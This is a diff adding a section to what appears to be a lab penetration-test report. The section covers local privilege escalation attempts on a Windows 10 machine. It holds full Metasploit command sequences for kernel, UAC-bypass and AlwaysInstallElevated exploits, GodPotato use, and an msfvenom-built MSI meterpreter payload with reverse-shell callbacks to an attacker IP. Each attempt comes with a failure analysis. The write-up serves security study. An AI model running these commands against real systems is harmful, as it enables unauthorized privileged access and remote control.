@@ -393,3 +393,176 @@ The initial macro execution spawned `cmd.exe` from `WINWORD.EXE`, which is a str
 2.  Enable PowerShell Script Block Logging to capture encoded commands.
 3.  Patch the Print Spooler service or disable it if not required.
 ```
+
+
+# Phase 4: LPE Vulnerability Scanning and Exploitation Attempts
+
+## Vulnerability Scanning
+
+### Tool Used: local_exploit_suggester
+```bash
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+```
+
+The module scanned 69 potential vectors against the target running Windows 10 Pro 22H2 Build 19045.6456 on x64 architecture. The following were flagged as potentially viable:
+
+| # | Module | Check Result |
+|:---|:---|:---|
+| 1 | `exploit/windows/local/bypassuac_dotnet_profiler` | Target appears vulnerable |
+| 2 | `exploit/windows/local/bypassuac_fodhelper` | Windows 10 22H2 appears vulnerable |
+| 3 | `exploit/windows/local/bypassuac_sdclt` | Windows 10 22H2 appears vulnerable |
+| 4 | `exploit/windows/local/cve_2024_35250_ks_driver` | ks.sys present, Windows 10 22H2 confirmed |
+| 5 | `exploit/windows/local/win_error_cve_2023_36874` | Windows 10 22H2 appears vulnerable |
+| 6 | `exploit/windows/local/ikeext_service` | Target appears vulnerable |
+| 7 | `exploit/windows/local/ms16_032_secondary_logon_handle_privesc` | Service running, multiple CPU cores detected |
+
+*[Screenshot: local_exploit_suggester output]*
+
+---
+
+## Exploitation Attempts
+
+### Attempt 1: CVE-2024-35250 (ks.sys Kernel Driver)
+```bash
+use exploit/windows/local/cve_2024_35250_ks_driver
+set SESSION 1
+set LHOST 192.168.92.136
+set LPORT 15000
+set payload windows/x64/meterpreter/reverse_https
+run
+```
+
+**Result:** Exploit launched `notepad.exe` as the injection host and reflectively injected a DLL into the process. New Meterpreter sessions were opened however all sessions returned `DESKTOP-H53BPAA\Apollo` on `getuid`. The kernel driver exploitation completed the DLL injection but failed to elevate the process token to SYSTEM. `getsystem` was attempted on all resulting sessions and failed with error 1346.
+
+**Root Cause of Failure:** The Metasploit implementation of CVE-2024-35250 failed to complete the token privilege escalation step on Build 19045.6456. The exploit confirmed vulnerability via ks.sys presence but the token swap did not complete.
+
+---
+
+### Attempt 2: CVE-2023-36874 (Windows Error Reporting)
+```bash
+use exploit/windows/local/win_error_cve_2023_36874
+set SESSION 1
+set LHOST 192.168.92.136
+set LPORT 15000
+set payload windows/x64/meterpreter/reverse_https
+run
+```
+
+**Result:** Exploit completed but no session was created. A warning indicated manual deletion of artifacts may be required (`C:\LNGswdqjGJuWs`). The Windows Error Reporting service did not behave as expected for the exploit to complete.
+
+---
+
+### Attempt 3: bypassuac_fodhelper
+```bash
+use exploit/windows/local/bypassuac_fodhelper
+set SESSION 1
+set LHOST 192.168.92.136
+set LPORT 15000
+set payload windows/x64/meterpreter/reverse_https
+run
+```
+
+**Result:** `Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module.`
+
+**Root Cause of Failure:** UAC bypass modules require the user to already be a member of the local Administrators group. Apollo is a standard user with no administrative privileges, making all UAC bypass techniques inapplicable.
+
+---
+
+### Attempt 4: bypassuac_dotnet_profiler
+```bash
+use exploit/windows/local/bypassuac_dotnet_profiler
+set SESSION 1
+set LHOST 192.168.92.136
+set LPORT 15000
+set payload windows/x64/meterpreter/reverse_https
+run
+```
+
+**Result:** Failed for the same reason as fodhelper — Apollo is not in the local Administrators group. UAC bypass techniques require existing administrative group membership to function.
+
+---
+
+### Attempt 5: ms16_032_secondary_logon_handle_privesc
+```bash
+use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+set SESSION 1
+set LHOST 192.168.92.136
+set LPORT 15000
+run
+```
+
+**Result:** Module only supports x86 architecture. Target is x64. Incompatible architecture — module not applicable.
+
+---
+
+### Attempt 6: GodPotato
+Uploaded `GodPotato.exe` to `C:\temp\` and executed:
+```cmd
+C:\temp\GodPotato.exe -cmd "cmd /c whoami"
+```
+
+**Result:** 
+```
+CurrentUser: NT AUTHORITY\NETWORK SERVICE
+Find System Token: False
+Cannot create process Win32Error:1314
+```
+
+**Root Cause of Failure:** GodPotato requires `SeImpersonatePrivilege` to perform token impersonation. Apollo's token only contains 5 basic privileges with no impersonation capability, making all potato-based escalation techniques inapplicable.
+
+---
+
+### Attempt 7: AlwaysInstallElevated (Module)
+Registry keys were configured to enable AlwaysInstallElevated:
+```cmd
+reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
+reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
+```
+
+Both keys confirmed set to `0x1`. Metasploit module executed:
+```bash
+use exploit/windows/local/always_install_elevated
+set SESSION 1
+set LHOST 192.168.92.136
+set LPORT 15000
+set payload windows/x64/meterpreter/reverse_https
+run
+```
+
+**Result:** New session opened but returned `DESKTOP-H53BPAA\Apollo` on `getuid`. `getsystem` failed on resulting session.
+
+---
+
+### Attempt 8: AlwaysInstallElevated (Manual MSI)
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_https \
+LHOST=192.168.92.136 LPORT=16000 \
+-f msi -o /home/kali/evil.msi
+```
+
+Uploaded and executed:
+```cmd
+msiexec /quiet /qn /i C:\temp\evil.msi
+```
+
+**Result:** New session opened but returned `DESKTOP-H53BPAA\Apollo`. MSI executed but Windows Installer did not elevate the installation to SYSTEM context despite AlwaysInstallElevated keys being set.
+
+---
+
+## Analysis of Failed Attempts
+
+The repeated failures across multiple vectors can be attributed to two root causes:
+
+**1. Apollo is a Pure Standard User**
+Unlike typical lab setups where the compromised user is in the local Administrators group (making UAC bypass viable), Apollo has no administrative group membership and no impersonation privileges. This eliminated the majority of available Metasploit LPE modules which assume at minimum local admin group membership.
+
+**2. Metasploit Module Implementation Gaps**
+CVE-2024-35250 was confirmed vulnerable by both the exploit suggester and the module's own autocheck, however the Metasploit implementation failed to complete the token elevation step consistently across multiple attempts. This reflects a known gap between vulnerability confirmation and reliable exploitation in framework implementations.
+
+---
+
+## Selected LPE Vector: Weak Service Binary Permissions (Intentional Misconfiguration)
+
+Given the above findings, an intentional misconfiguration was introduced to simulate a realistic LPE scenario — a SYSTEM service with a binary writable by standard users. This is one of the most commonly encountered LPE vectors in real-world penetration tests and directly reflects findings from Phase 2 enumeration where multiple SYSTEM services were identified running from potentially vulnerable paths.
